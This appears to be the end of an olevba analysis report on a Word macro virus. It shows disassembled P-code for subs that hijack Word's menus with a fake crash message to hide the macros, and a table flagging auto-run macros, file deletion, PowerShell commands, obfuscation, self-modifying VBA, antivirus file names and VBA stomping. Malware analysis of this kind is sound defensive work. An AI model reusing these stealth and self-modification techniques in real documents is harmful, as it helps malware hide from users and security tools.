' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #225:
' Line #226:
' 	EndSub 
' Line #227:
' Line #228:
' 	FuncDefn (Sub ToolsOptions())
' Line #229:
' Line #230:
' 	LitStr 0x0046 "This program has performed an illegal operation and will be shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #231:
' Line #232:
' 	EndSub 
' Line #233:
' Line #234:
' 	FuncDefn (Sub ViewVBCode())
' Line #235:
' Line #236:
' 	LitStr 0x0046 "This program has performed an illegal operation and will be shut down."
' 	Ld vbCritical 
' 	LitStr 0x000E "Microsoft Word"
' 	ArgsCall MsgBox 0x0003 
' Line #237:
' Line #238:
' 	EndSub 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Command             |May run PowerShell commands                  |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |Scan32.dll          |Executable file name                         |
|IOC       |Mcscan32.dll        |Executable file name                         |
|IOC       |mcscan32.dll        |Executable file name                         |
|IOC       |Avp32.exe           |Executable file name                         |
|IOC       |macro.exe           |Executable file name                         |
|IOC       |prot.exe            |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

